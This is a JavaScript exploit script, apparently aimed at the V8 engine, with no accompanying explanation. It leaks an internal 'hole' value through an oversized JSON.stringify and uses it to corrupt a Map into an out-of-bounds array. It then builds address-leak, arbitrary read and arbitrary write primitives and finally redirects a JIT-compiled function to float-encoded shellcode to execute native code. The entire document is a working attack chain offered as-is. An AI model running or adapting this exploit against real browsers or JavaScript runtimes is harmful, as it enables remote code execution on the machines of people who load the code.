var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val) {
    u64[0] = val;
    return u32[1];
}

function trigger() {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }
    throw new Error('could not trigger');
}

let leak_hole = trigger();

let map = new Map();
map.set(1, 1);
map.set(leak_hole, 1);
map.delete(leak_hole);
map.delete(leak_hole);
map.delete(1);


map.set(20, -1);
var oob_arr = [1.1];
var tmp_arr = [2.2];
var rw_arr  = [3.3];
var obj_arr = [0xeada, rw_arr];
map.set(0x41414145, 0);
var cor_length = oob_arr.length;


function addressOf(obj){
    obj_arr[1] = obj;
    return f64_to_u64(oob_arr[0x16]);
}

function AAR(addr){
    oob_arr[0x11] = u64_to_f64(addr-0x10n);
    return f64_to_u64(rw_arr[0]);
}

function AAW(addr,val){
    oob_arr[0x11] = u64_to_f64(addr-0x10n);
    rw_arr[0] = u64_to_f64(val);
}

const shellcode = () => {return [
    1.9553825422107533e-246,
    1.9560612558242147e-246,
    1.9995714719542577e-246,
    1.9533767332674093e-246,
    2.6348604765229606e-284
];}


for(let i = 0; i< 80000; i++){
    shellcode();shellcode();
}

var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0x30n);
var rop_addr = code_addr + 0xcdn - 0x5fn;

AAW(shellcode_addr+0x30n, rop_addr);
shellcode();